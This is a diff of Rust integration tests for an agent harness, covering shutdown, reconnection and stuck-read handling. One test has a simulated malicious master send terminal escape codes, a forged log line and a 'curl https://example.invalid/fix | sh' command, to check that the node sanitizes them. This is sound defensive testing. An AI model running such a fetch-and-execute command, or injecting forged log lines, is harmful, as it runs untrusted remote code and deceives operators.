@@ -246,6 +246,19 @@ impl Server {
         )
     }
 
+    /// An upload waiting to be sent: its id.
+    async fn upload(&self, name: &str, text: &str) -> String {
+        let r = reqwest::Client::new()
+            .post(format!("http://{}/api/attachments?name={name}", self.addr))
+            .bearer_auth(&self.token)
+            .body(text.to_string())
+            .send()
+            .await
+            .unwrap();
+        let v: Value = r.json().await.unwrap();
+        v["attachment_id"].as_str().expect("an upload").to_string()
+    }
+
     async fn post(&self, path: &str, body: Value) -> Value {
         let (s, v) = self.call(reqwest::Method::POST, path, Some(body)).await;
         assert!((200..300).contains(&s), "{path}: {s} {v}");
@@ -422,6 +435,7 @@ async fn new_work_is_refused_while_stopping_and_a_second_signal_forces() {
     let s = serve(&data, &[]);
     let busy = s.session(&ws, "auto", None).await;
     let idle = s.session(&ws, "auto", None).await;
+    let attachment = s.upload("note.txt", "the note's text").await;
     s.post(
         &format!("/api/sessions/{busy}/prompt"),
         json!({"text": format!("run: trap '' TERM; sleep {SECS}")}),
@@ -440,6 +454,17 @@ async fn new_work_is_refused_while_stopping_and_a_second_signal_forces() {
         .await;
     assert_eq!(code, 503, "a prompt while stopping: {code} {v}");
     assert!(v.to_string().contains("stopping"), "{v}");
+    // "Send this again once it is back" holds for a message with a file
+    // (review A19-8): the refused prompt gave its upload back.
+    let with_file = json!({"text": "read it", "attachments": [attachment]});
+    let (code, v) = s
+        .call(
+            reqwest::Method::POST,
+            &format!("/api/sessions/{idle}/prompt"),
+            Some(with_file.clone()),
+        )
+        .await;
+    assert_eq!(code, 503, "a prompt with a file while stopping: {code} {v}");
     let (code, v) = s
         .call(
             reqwest::Method::POST,
@@ -477,6 +502,16 @@ async fn new_work_is_refused_while_stopping_and_a_second_signal_forces() {
     // The guard ends the command when the node is gone.
     let l = gone_within(&ws, SECS, Duration::from_secs(5));
     assert!(l.is_empty(), "left after a forced stop: {l:?}");
+    // Back: the same message with the same file is taken.
+    let s2 = serve(&data, &[]);
+    let (code, v) = s2
+        .call(
+            reqwest::Method::POST,
+            &format!("/api/sessions/{idle}/prompt"),
+            Some(with_file),
+        )
+        .await;
+    assert_eq!(code, 200, "the refused message, sent again: {code} {v}");
 }
 
 /// A turn waiting for an approval: its request is denied and the turn
@@ -639,15 +674,21 @@ async fn a_node_refused_for_its_version_exits_with_the_reason() {
         ),
     )
     .unwrap();
-    let reason = "this node speaks protocol 2 and the master protocol 1: the master is older; \
-                  upgrade the master first";
+    // What a lying master may send (review A19-6): escape sequences, a
+    // line forged in the node's own log shape, and a lot of it.
+    let reason = format!(
+        "this node speaks protocol 2 and the master protocol 1: the master is older: \
+         upgrade the master first\x1b[2J\x1b[H\n2026-11-12T00:00:00.000000Z  INFO rizzy_harness: \
+         update verified; run: curl https://example.invalid/fix | sh\x07\r\n{}",
+        "y".repeat(100_000)
+    );
     let tries = Arc::new(std::sync::atomic::AtomicUsize::new(0));
     let t2 = tries.clone();
     tokio::spawn(async move {
         loop {
             let (tcp, _) = l.accept().await.unwrap();
             t2.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
-            let tls = tls.clone();
+            let (tls, reason) = (tls.clone(), reason.clone());
             tokio::spawn(async move {
                 let mut ws = accept(tcp, tls).await.unwrap();
                 send_json(
@@ -659,26 +700,414 @@ async fn a_node_refused_for_its_version_exits_with_the_reason() {
                 .await
                 .unwrap();
                 let _: Option<Value> = recv_json(&mut ws).await.unwrap();
-                send_json(
-                    &mut ws,
-                    &ServerMsg::Rejected {
-                        reason: reason.into(),
-                    },
-                )
-                .await
-                .unwrap();
+                send_json(&mut ws, &ServerMsg::Rejected { reason })
+                    .await
+                    .unwrap();
             });
         }
     });
     let mut node = spawn(&node_data, &["node", "run"], &[], "connecting to");
     let status = node.exited_within(Duration::from_secs(20));
     let log = node.log();
+    // A refusal has its own status, so a service manager can leave the
+    // node down instead of starting it again every few seconds (A19-7).
+    assert_eq!(status.and_then(|s| s.code()), Some(77), "{status:?}\n{log}");
+    let refused: Vec<&str> = log
+        .lines()
+        .filter(|l| l.contains("the master refused this node: this node speaks protocol 2"))
+        .collect();
+    assert_eq!(refused.len(), 1, "{log}");
     assert!(
-        status.is_some_and(|s| s.code().is_some_and(|c| c != 0)),
-        "{status:?}\n{log}"
+        refused[0].len() < 700,
+        "the reason is not capped: {} bytes",
+        refused[0].len()
     );
-    assert!(log.contains("upgrade the master first"), "{log}");
+    assert!(log.len() < 20_000, "{} bytes on stderr", log.len());
+    assert!(
+        !log.bytes().any(|b| b < 0x20 && b != b'\n' || b == 0x7f),
+        "a control byte reached the node's stderr: {log:?}"
+    );
+    assert!(
+        !log.lines()
+            .any(|l| l.starts_with("2026-11-12T00:00:00.000000Z")),
+        "a line forged by the master: {log}"
+    );
     // A second or two more to see it does not come back.
     tokio::time::sleep(Duration::from_secs(2)).await;
     assert_eq!(tries.load(std::sync::atomic::Ordering::SeqCst), 1, "{log}");
+}
+
+// ---- review A19-1: a thread that never returns ----
+
+fn have(program: &str) -> bool {
+    Command::new(program)
+        .arg("--version")
+        .stdin(Stdio::null())
+        .stdout(Stdio::null())
+        .stderr(Stdio::null())
+        .status()
+        .is_ok()
+}
+
+fn fuse_required() -> bool {
+    std::env::var_os("HARNESS_REQUIRE_FUSE").is_some_and(|v| v == "1")
+}
+
+/// `support/fuse_stall.py` mounted at `mnt` (as `guard.rs` mounts it):
+/// every READ of `mnt/stall` is held until the server ends.
+struct Stall {
+    server: Option<Child>,
+    lines: std::io::Lines<BufReader<std::process::ChildStdout>>,
+    mnt: PathBuf,
+}
+
+impl Stall {
+    fn mount(mnt: &Path) -> Option<Self> {
+        if !(have("python3") && have("fusermount3") && Path::new("/dev/fuse").exists()) {
+            assert!(!fuse_required(), "no python3, fusermount3 or /dev/fuse");
+            eprintln!("SKIPPED: no python3, fusermount3 or /dev/fuse");
+            return None;
+        }
+        std::fs::create_dir_all(mnt).unwrap();
+        let mut server = Command::new("python3")
+            .arg("-I")
+            .arg(concat!(
+                env!("CARGO_MANIFEST_DIR"),
+                "/tests/support/fuse_stall.py"
+            ))
+            .arg(mnt)
+            .stdin(Stdio::piped())
+            .stdout(Stdio::piped())
+            .spawn()
+            .unwrap();
+        let mut lines = BufReader::new(server.stdout.take().unwrap()).lines();
+        match lines.next() {
+            Some(Ok(l)) if l == "mounted" => Some(Self {
+                server: Some(server),
+                lines,
+                mnt: mnt.to_owned(),
+            }),
+            other => {
+                let _ = server.kill();
+                let _ = server.wait();
+                assert!(!fuse_required(), "FUSE does not mount here: {other:?}");
+                eprintln!("SKIPPED: FUSE does not mount here: {other:?}");
+                None
+            }
+        }
+    }
+
+    fn held(&mut self) {
+        assert_eq!(
+            self.lines.next().map(|l| l.unwrap()).as_deref(),
+            Some("read"),
+            "the server never saw the read"
+        );
+    }
+
+    fn release(&mut self) {
+        if let Some(mut s) = self.server.take() {
+            drop(s.stdin.take());
+            let _ = s.kill();
+            let _ = s.wait();
+        }
+    }
+}
+
+impl Drop for Stall {
+    fn drop(&mut self) {
+        self.release();
+        let _ = Command::new("fusermount3")
+            .args(["-u", "-z", "--"])
+            .arg(&self.mnt)
+            .status();
+    }
+}
+
+/// Whether another process could take the data directory's lock now
+/// (taken and given back at once).
+fn lock_free(data: &Path) -> bool {
+    let f = std::fs::OpenOptions::new()
+        .read(true)
+        .write(true)
+        .open(data.join("lock"))
+        .unwrap();
+    f.try_lock().is_ok()
+}
+
+/// The node's `read` tool waits on a mount that does not answer (a network
+/// folder whose server went away). The stop abandons the tool after the
+/// agent loop's grace and the turn ends `stopped`; the process then calls
+/// its exit within a bound although that thread never returns. A thread
+/// in a FUSE read the server holds waits in the kernel uninterruptibly,
+/// so the kernel keeps the process (its leader a zombie, `Z`) until the
+/// read returns: until then the data directory stays locked and a second
+/// start is refused; once the read is released the process is reaped with
+/// exit status 0.
+#[tokio::test(flavor = "multi_thread")]
+async fn a_stop_exits_past_a_stuck_thread_and_holds_the_lock_until_gone() {
+    let (_dir, data, ws) = setup();
+    let mut s = serve(&data, &[]);
+    // Mounted after the server started, so it is dropped (released) first:
+    // a process whose thread waits on it can only be reaped after that.
+    let Some(mut stall) = Stall::mount(&ws.join("mnt")) else {
+        return;
+    };
+    let sid = s.session(&ws, "auto", None).await;
+    s.post(
+        &format!("/api/sessions/{sid}/prompt"),
+        json!({"text": "read: mnt/stall"}),
+    )
+    .await;
+    tokio::task::block_in_place(|| stall.held());
+    let pid = s.proc.pid();
+    let asked = Instant::now();
+    s.proc.signal(Signal::SIGTERM);
+    // The exit is called within the bound (the leader is a zombie: only the
+    // stuck thread keeps the process), and the lock is never free meanwhile.
+    let by = asked + Duration::from_secs(15);
+    while state(pid) != Some('Z') {
+        assert!(
+            !lock_free(&data),
+            "the lock was free {:?} after SIGTERM while the process lived\n{}",
+            asked.elapsed(),
+            s.proc.log()
+        );
+        if Instant::now() >= by {
+            stall.release();
+            panic!(
+                "the process did not exit within 15 s (state {:?})\n{}",
+                state(pid),
+                s.proc.log()
+            );
+        }
+        std::thread::sleep(Duration::from_millis(50));
+    }
+    let exiting = asked.elapsed();
+    assert!(!lock_free(&data), "the lock went before the process");
+    let second = Command::new(EXE)
+        .args(["--data-dir", data.to_str().unwrap()])
+        .args(["serve", "--bind", "127.0.0.1:0"])
+        .current_dir(data.parent().unwrap())
+        .stdin(Stdio::null())
+        .output()
+        .unwrap();
+    let err = String::from_utf8_lossy(&second.stderr);
+    assert!(
+        err.contains("is in use by"),
+        "a second start beside it: {err}"
+    );
+    // The read returns: the process goes, with the stop's status.
+    stall.release();
+    let status = s.proc.exited_within(Duration::from_secs(10));
+    let log = s.proc.log();
+    assert_eq!(status.and_then(|s| s.code()), Some(0), "{status:?}\n{log}");
+    assert!(lock_free(&data));
+    eprintln!("exit called {exiting:?} after SIGTERM");
+    let s2 = serve(&data, &[]);
+    assert_eq!(end_reason(&s2.events(&sid).await), "stopped");
+}
+
+// ---- review A19-3: the after-turn checkpoint inside the stop ----
+
+/// A command made a folder whose snapshot takes the checkpoint's whole
+/// limit (a sparse file: no disk, all time). The stop still waits for it
+/// and closes the turn `stopped`, with exit 0.
+#[tokio::test(flavor = "multi_thread")]
+async fn a_slow_after_turn_checkpoint_still_ends_stopped() {
+    const SECS: u32 = 974_956;
+    let (_dir, data, ws) = setup();
+    if !containment(&data.parent().unwrap().join("probe")) {
+        return;
+    }
+    let _clean = Cleanup(ws.clone(), SECS);
+    let s = serve(&data, &[]);
+    let sid = s.session(&ws, "auto", None).await;
+    s.post(
+        &format!("/api/sessions/{sid}/prompt"),
+        json!({"text": format!("run: truncate -s 60G big; sleep {SECS}")}),
+    )
+    .await;
+    wait_sleeping(SECS, &s).await;
+    let mut s = s;
+    let asked = Instant::now();
+    s.proc.signal(Signal::SIGTERM);
+    let status = s.proc.exited_within(Duration::from_secs(120));
+    let log = s.proc.log();
+    assert_eq!(
+        status.and_then(|s| s.code()),
+        Some(0),
+        "exit {status:?} after {:?}\n{log}",
+        asked.elapsed()
+    );
+    let s2 = serve(&data, &[]);
+    assert_eq!(end_reason(&s2.events(&sid).await), "stopped");
+    eprintln!("stopped in {:?}", asked.elapsed());
+}
+
+/// The bound itself, reached through the debug build's shortened wait: the
+/// process exits 1 and names the session left open.
+#[tokio::test(flavor = "multi_thread")]
+async fn a_stop_past_its_bound_exits_1_naming_the_sessions() {
+    const SECS: u32 = 974_957;
+    let (_dir, data, ws) = setup();
+    if !containment(&data.parent().unwrap().join("probe")) {
+        return;
+    }
+    let _clean = Cleanup(ws.clone(), SECS);
+    let args = ["serve", "--bind", "127.0.0.1:0"];
+    let proc = spawn(
+        &data,
+        &args,
+        &[("HARNESS_STOP_WAIT_S", "2")],
+        "listening on http://",
+    );
+    let addr = proc
+        .out
+        .iter()
+        .find_map(|l| l.split("listening on http://").nth(1))
+        .unwrap()
+        .trim()
+        .to_string();
+    let token = std::fs::read_to_string(data.join("api-token"))
+        .unwrap()
+        .trim()
+        .to_string();
+    let mut s = Server { proc, addr, token };
+    let sid = s.session(&ws, "auto", None).await;
+    s.post(
+        &format!("/api/sessions/{sid}/prompt"),
+        json!({"text": format!("run: truncate -s 60G big; sleep {SECS}")}),
+    )
+    .await;
+    wait_sleeping(SECS, &s).await;
+    s.proc.signal(Signal::SIGTERM);
+    let status = s.proc.exited_within(Duration::from_secs(20));
+    let log = s.proc.log();
+    assert_eq!(status.and_then(|s| s.code()), Some(1), "{status:?}\n{log}");
+    assert!(log.contains(&sid) && log.contains("still running"), "{log}");
+}
+
+// ---- review N-11: `node run`'s second signal, the link down ----
+
+/// The node's second signal exits at once, and its command goes with it.
+#[tokio::test(flavor = "multi_thread")]
+async fn a_second_signal_forces_a_node() {
+    const SECS: u32 = 974_958;
+    let (_dir, data, ws) = setup();
+    if !containment(&data.parent().unwrap().join("probe")) {
+        return;
+    }
+    let _clean = Cleanup(ws.clone(), SECS);
+    let node_data = data.parent().unwrap().join("node");
+    write_config(&node_data, &ws);
+    let s = serve(&data, &["--node-listen", "127.0.0.1:0"]);
+    let mut node = remote_node(&s, &node_data).await;
+    let sid = node_session(&s, &node_data, &ws, &node).await;
+    s.post(
+        &format!("/api/sessions/{sid}/prompt"),
+        json!({"text": format!("run: trap '' TERM; sleep {SECS}")}),
+    )
+    .await;
+    wait_sleeping(SECS, &s).await;
+    node.signal(Signal::SIGTERM);
+    tokio::time::sleep(Duration::from_millis(300)).await;
+    assert!(!left(&ws, SECS).is_empty(), "the command already ended");
+    let forced = Instant::now();
+    node.signal(Signal::SIGINT);
+    let status = node.exited_within(Duration::from_secs(1));
+    assert_eq!(
+        status.and_then(|s| s.code()),
+        Some(1),
+        "{status:?} after {:?}\n{}",
+        forced.elapsed(),
+        node.log()
+    );
+    let l = gone_within(&ws, SECS, Duration::from_secs(5));
+    assert!(l.is_empty(), "left: {l:?}");
+}
+
+/// The server stops first (its remote node keeps its turn), then the node
+/// stops with its master away; when both are back the end is replayed to
+/// the master once.
+#[tokio::test(flavor = "multi_thread")]
+async fn a_node_stopped_with_its_master_away_replays_the_end_once() {
+    const SECS: u32 = 974_959;
+    let (_dir, data, ws) = setup();
+    if !containment(&data.parent().unwrap().join("probe")) {
+        return;
+    }
+    let _clean = Cleanup(ws.clone(), SECS);
+    let node_data = data.parent().unwrap().join("node");
+    write_config(&node_data, &ws);
+    let s = serve(&data, &["--node-listen", "127.0.0.1:0"]);
+    let port = s
+        .proc
+        .out
+        .iter()
+        .find(|l| l.starts_with("nodes connect to wss://"))
+        .and_then(|l| l.split(':').nth(2))
+        .and_then(|p| p.split_whitespace().next())
+        .unwrap()
+        .to_string();
+    let mut node = remote_node(&s, &node_data).await;
+    let sid = node_session(&s, &node_data, &ws, &node).await;
+    s.post(
+        &format!("/api/sessions/{sid}/prompt"),
+        json!({"text": format!("run: sleep {SECS}")}),
+    )
+    .await;
+    wait_sleeping(SECS, &s).await;
+    let mut s = s;
+    s.proc.signal(Signal::SIGTERM);
+    let st = s.proc.exited_within(WITHIN);
+    assert_eq!(st.and_then(|s| s.code()), Some(0), "{}", s.proc.log());
+    assert!(
+        !left(&ws, SECS).is_empty(),
+        "the server's stop ended the node's command"
+    );
+    node.signal(Signal::SIGTERM);
+    let st = node.exited_within(WITHIN);
+    assert_eq!(st.and_then(|s| s.code()), Some(0), "{}", node.log());
+    let l = gone_within(&ws, SECS, Duration::from_secs(5));
+    assert!(l.is_empty(), "left: {l:?}");
+    let listen = format!("127.0.0.1:{port}");
+    let s2 = serve(&data, &["--node-listen", &listen]);
+    let _node = spawn(&node_data, &["node", "run"], &[], "connecting to");
+    let evs = s2.wait_for(&sid, "turn_ended").await;
+    tokio::time::sleep(Duration::from_millis(500)).await;
+    let evs2 = s2.events(&sid).await;
+    assert_eq!(evs.len(), evs2.len(), "more came after the end");
+    let ends: Vec<&Value> = evs2.iter().filter(|e| e["kind"] == "turn_ended").collect();
+    assert_eq!(ends.len(), 1, "{evs2:#?}");
+    assert_eq!(end_reason(&evs2), "stopped");
+    for (i, e) in evs2.iter().enumerate() {
+        assert_eq!(e["seq"], i as u64 + 1, "{evs2:#?}");
+    }
+}
+
+/// A session on the joined node of `node_data` (retried until the node is
+/// linked).
+async fn node_session(s: &Server, node_data: &Path, ws: &Path, node: &Proc) -> String {
+    let node_id = std::fs::read_to_string(node_data.join("remote.toml"))
+        .unwrap()
+        .lines()
+        .find_map(|l| {
+            l.strip_prefix("node_id = ")
+                .map(|v| v.trim_matches('"').to_string())
+        })
+        .unwrap();
+    let by = Instant::now() + WITHIN;
+    loop {
+        let body = json!({"cwd": ws.display().to_string(), "approval_mode": "auto",
+                          "node_id": node_id});
+        let (code, v) = s
+            .call(reqwest::Method::POST, "/api/sessions", Some(body))
+            .await;
+        if code == 200 {
+            return v["session_id"].as_str().unwrap().to_string();
+        }
+        assert!(Instant::now() < by, "{code} {v}\n{}", node.log());
+        tokio::time::sleep(Duration::from_millis(100)).await;
+    }
 }
